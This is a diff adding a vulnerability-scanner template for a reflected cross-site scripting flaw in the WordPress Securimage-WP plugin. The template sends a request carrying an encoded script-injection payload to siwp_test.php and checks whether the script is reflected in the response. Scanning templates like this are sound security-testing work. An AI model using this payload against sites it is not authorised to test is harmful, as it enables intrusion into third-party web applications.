@@ -1,0 +1,16 @@
+information:
+  name: WordPress Plugin Securimage-WP - 'siwp_test.php' Reflected Cross-Site Scripting (XSS)
+  id: wp-securimage-xss
+  risk: medium
+  authors: daffainfo
+  tags: wordpress, xss, wp-plugin
+
+code: |
+  let path = "/wp-content/plugins/securimage-wp/siwp_test.php/%22/%3E%3Cscript%3Ealert(1);%3C/script%3E?tested=1"
+  let response = await _MakeQuest_(`{{url}}${path}`)
+
+  if(response.data.indexOf("<script>alert(1)</script>") != -1 && response.status == 200){
+    Logger.attack_log({{self_info}}, `{{url}}${path}`)
+  }
+
+  resolve()
